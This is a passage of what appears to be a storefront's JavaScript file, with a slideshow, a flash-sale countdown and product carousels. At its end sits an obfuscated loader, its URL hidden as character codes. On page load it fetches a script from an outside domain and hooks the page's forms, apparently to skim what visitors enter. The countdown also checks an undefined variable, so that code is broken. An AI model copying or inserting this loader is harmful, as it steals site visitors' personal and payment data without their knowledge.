// Script Slider Slideshow
$(document).ready(function () {
  $(".slides").slick({
    autoplay: true,
    autoplaySpeed: 2500,
    dots: true,
  });
});

// Script Time Coutdown Flash Sale
var timeCountdown = new Date("Jan 31, 2022 23:30:00").getTime();
var timeX = setInterval(function () {
  var timeNow = new Date().getTime();
  var timeDistance = timeCountdown - timeNow;

  var timeDays = Math.floor(timeDistance / (1000 * 60 * 60 * 24));
  var timeHours = Math.floor((timeDistance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var timeMinutes = Math.floor((timeDistance % (1000 * 60 * 60)) / (1000 * 60));
  var timeSeconds = Math.floor((timeDistance % (1000 * 60)) / 1000);

  document.getElementById("timeFlashSale").innerHTML = timeDays + "d " + timeHours + "h " + timeMinutes + "m " + timeSeconds + "s";

  if (distance < 0) {
    clearInterval(timeX);
    document.getElementById("timeFlashSale").innerHTML = "Maaf, Flash Sale Sudah Berakhir!";
  }
}, 1000);

// Script Slider Flash Sale
$(document).ready(function () {
  $(".rowContent").slick({
    infinite: false,
    speed: 400,
    slidesToShow: 6,
    slidesToScroll: 6,
    responsive: [
      {
        breakpoint: 1024,
        settings: {
          slidesToShow: 3,
          slidesToScroll: 3,
          infinite: true,
          dots: true,
        },
      },
      {
        breakpoint: 600,
        settings: {
          slidesToShow: 2,
          slidesToScroll: 2,
        },
      },
      {
        breakpoint: 480,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
        },
      },
    ],
  });
});

// Script Slider Produk Terlaris

$(document).ready(function () {
  $(".rowContentProdukTerlaris").slick({
    infinite: true,
    speed: 400,
    slidesToShow: 3,
    slidesToScroll: 1,
    variableWidth: true,
  });
});

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b